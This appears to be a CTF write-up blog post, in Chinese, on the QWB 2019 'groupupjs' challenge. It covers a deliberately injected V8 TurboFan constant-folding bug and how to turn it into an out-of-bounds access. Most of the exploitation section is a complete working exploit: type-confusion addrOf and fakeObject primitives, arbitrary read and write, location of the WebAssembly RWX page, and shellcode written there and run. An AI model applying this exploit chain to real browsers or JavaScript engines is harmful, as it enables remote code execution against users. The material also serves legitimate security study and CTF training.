---

layout: post

title: 'qwb2019 final groupupjs分析'

date: '2020-08-14'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

## 前言

### 环境搭建

```c
git reset --hard 7.7.2
git apply < ../diff.patch
gclient sync
./tools/dev/gm.py x64.release
./tools/dev/gm.py x64.debug
```

### IR优化的流程图

![img](D:\github\De4dCr0w.github.io\image\2020-08-14-qwb2019-final-groupupjs分析\6.png)



## 漏洞分析

引入漏洞的补丁：

```c
diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc
index a6a8e87cf4..164ab44fab 100644
--- a/src/compiler/machine-operator-reducer.cc
+++ b/src/compiler/machine-operator-reducer.cc
@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) {
       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M < x => false
       if (m.right().Is(0)) return ReplaceBool(false);          // x < 0 => false
       if (m.IsFoldable()) {                                    // K < K => K
-        return ReplaceBool(m.left().Value() < m.right().Value());
+        return ReplaceBool(m.left().Value() < m.right().Value() + 1);
       }
       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x < x => false
       if (m.left().IsWord32Sar() && m.right().HasValue()) {                                                           
```

分析该补丁，只添加了两个字节，上述代码发生在MachineOperatorReducer阶段，用于将确定性的比较操作直接优化为一个布尔常量，如kMaxUInt32 < x 优化成false，x < 0优化成false，因为x属于无符号整数，不会小于0. 还有一种情况是相等的两个常数，如4 < 4， 优化成false。但引入的补丁将 4< 4 变4 < （4+1），导致结果 为true。

该patch会导致Uint32LessThan 比较时出错，进而导致CheckBound节点出错，因为当正常访问范围时，v8会通过优化，利用Uint32LessThan来消除CheckBound，demo代码如下：

```javascript
function opt(){
	let arr = [0, 1, 2, 3];
	let idx = 3;
	return arr[idx];
}

for(var i=0; i < 0x10000; i++)
    opt()

var x = opt()
console.log(x)
```

该版本的v8 在simplified lowering 阶段优化时已经不再移除 CheckBound节点了，但是它会把CheckBounds替换为一个CheckedUint32Bounds节点， 并且在Effect Linearization优化阶段，CheckedUint32Bounds又会被进一步替换为Uint32LessThan。

simplified lowering 阶段：

![image-20200818110837700](D:\github\De4dCr0w.github.io\image\2020-08-14-qwb2019-final-groupupjs分析\1.png)



Effect  Linearization阶段：

![image-20200818110352706](D:\github\De4dCr0w.github.io\image\2020-08-14-qwb2019-final-groupupjs分析\2.png)



但是直接进行越界访问，无法成功，demo代码如下：

```javascript
function opt(){
	let arr = [0, 1, 2, 3];
	let idx = 4;
	return arr[idx];
}

for(var i=0; i < 0x10000; i++)
    opt()

var x = opt()
console.log(x)
```

因为在LoadElimination Phase阶段，消除了LoadElement节点，idx变量被LoadElimination中的常数折叠直接消除了，无法加载数组进行访问。

LoadElimination Phase阶段：

![image-20200817104808240](D:\github\De4dCr0w.github.io\image\2020-08-14-qwb2019-final-groupupjs分析\3.png)

所以为了避免常数折叠，需要赋予CheckBound一个不确定的范围。

有如下三种方法： 

（1）对idx变量进行一些算数运算

```javascript
function opt(){
	let arr = [0, 1, 2, 3];
	let idx = 4;
 	idx &= 0xfff;
	return arr[idx];
}

for(var i=0; i < 0x10000; i++)
    opt()

var x = opt()
console.log(x)
```

（2）进行逃逸分析优化

因为EscapeAnalysisPhase 在 LoadEliminationPhase 后面，到这一步turbolizer才知道o.x的值为4。所以可以把一个常数放在非逃逸对象中来避免常数折叠。

```javascript
function opt(){
	let arr = [0, 1, 2, 3];
	let o = {x: 4};
 	return arr[o.x];
}

for(var i=0; i < 0x10000; i++)
    opt()

var x = opt()
console.log(x)
```

（3）利用无效的phi节点来混淆range信息：

```javascript
function opt(x){
	let arr = [0, 1, 2, 3];
	let idx = (x="foo")?4:2;
	return a[idx];
}

for(var i=0; i < 0x10000; i++)
    opt()

var x = opt("foo")
console.log(x)
```



## 漏洞利用

从上述可知，目前可以利用该漏洞越界读写一个字节，参考starctf2019-v8-oob解题思路，泄露float_array_map和obj_array_map，进行互相覆盖，造成类型混淆。

（1）利用漏洞越界读map，泄露float_array_map，由于obj_array_map是一个map对象，而不是浮点数对象，不能直接越界读，但map 生成的时候偏移是固定的，可以利用float_array_map 加上偏移获取obj_array_map

（2）构造fakeObject和addrOf原语

构造addrOf时，泄露出来的float_array_map是一个浮点数，不能用于直接覆盖obj array的map，需要将float_array_map先转成一个map对象，所以先构造fakeObject原语，将float_array_map 转成一个float array map 对象。

（3）和starctf2019-v8-oob类似，构造fake_array和faked_object，此时可以通过fake_array[2] 修改faked_object->elements，通过fake_array[3] 修改faked_object->length。所以将faked_object->elements填充为fake_array，faked_object->length改成0x2000，就可以对faked_object进行越界读写。

![img](D:\github\De4dCr0w.github.io\_posts\image\5-1597719508911.png)

（4） 在fake_array后面布置data_buf和obj，根据mark查找wasm_function对象的地址，根据data_buf的大小查找data_buf-> backing_store，用于构造任意读写原语。

（5）根据wasm_function–>shared_info–>WasmExportedFunctionData（data）–>instance+0xe8 找到rwx的区域，将shellcode写入该区域即可。



exp 代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var obj;
var obj_array;
function opt(){
	obj = [1.1, 2.2];
	obj_array = [obj];
	let o = {x : 2};
	return obj[o.x];
}

for(var i=0; i < 0x10000; i++){
    opt();
}

var float_array_map = opt();
console.log("[+] float_array_map: 0x"+ hex(f2i(float_array_map)));

var obj_array_map = i2f(f2i(float_array_map) + 0xa0);
console.log("[+] obj_array_map: 0x"+ hex(f2i(obj_array_map)));


function fakeObject_opt(addr)
{
	let array = [addr, addr];
	let o = {x : 2};
	array[o.x] = obj_array_map;
	return array;
}

for(let i=0; i < 0x10000; i++){
	fakeObject_opt(float_array_map);
}

function fakeObject(addr)
{
	let ret = fakeObject_opt(addr);
	return ret[0];

}
var float_map_obj = fakeObject(float_array_map);
//%DebugPrint(float_map_obj);

function addrOf_opt(obj)
{
	let array = [obj, obj];
	let o = {x : 2};
	array[o.x] = float_map_obj; 
	return array;
}

var tmp_obj = {"a":1};

for(let i=0; i < 0x10000; i++)
	addrOf_opt(tmp_obj);

function addressOf(obj)
{
	let ret = addrOf_opt(obj);
	return ret[0];
}

var fake_array = [
	float_array_map,
	i2f(0),
	i2f(0x41414141),
	i2f(0x200000000000),
	1.1,
	2.2
];

%DebugPrint(fake_array); // fake array map address
var fake_array_addr = f2i(addressOf(fake_array));
console.log("[+] fake_array_addr: 0x"+hex(fake_array_addr));
var fake_object_addr = fake_array_addr - 0x40 + 0x10;
console.log("[+] fake_object_addr: 0x"+hex(fake_object_addr));
var fake_object = fakeObject(i2f(fake_object_addr));

fake_array[2] = i2f(fake_array_addr);

%DebugPrint(fake_object.length);

data_buf = new ArrayBuffer(0x233);
obj = {mark: i2f(0xdeadbeef), obj: wasm_function};

//---------find wasm_function

%DebugPrint(wasm_function);

var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(fake_object[i]) == 0xdeadbeef){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(fake_object[float_obj_idx])));
		break;
	}
}

//------ find backing_store
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(fake_object[i]) == 0x233){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(fake_object[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read
function dataview_read64(addr)
{
	fake_object[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	fake_object[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

//----- get wasm_code by AAR

var wasm_function_addr = f2i(fake_object[float_obj_idx]);
console.log("[+] wasm_function_addr: 0x"+hex(wasm_function_addr));

var wasm_shared_info = dataview_read64(wasm_function_addr -1 + 0x18);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_data = dataview_read64(wasm_shared_info -1 + 0x8);
console.log("[+] find wasm_data : 0x" + hex(wasm_data));

var wasm_instance = dataview_read64(wasm_data -1 + 0x10);
console.log("[+] find wasm_instance : 0x" + hex(wasm_instance));

var wasm_rwx = dataview_read64(wasm_instance - 1 + 0x88);
console.log("[+] find wasm_rwx : 0x" + hex(wasm_rwx));


//write shellcode to wasm
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();
```



运行效果图：

![image-20200818101431155](D:\github\De4dCr0w.github.io\image\2020-08-14-qwb2019-final-groupupjs分析\4.png)



## 参考链接

https://zhuanlan.zhihu.com/p/73081003

https://xz.aliyun.com/t/5870#toc-2

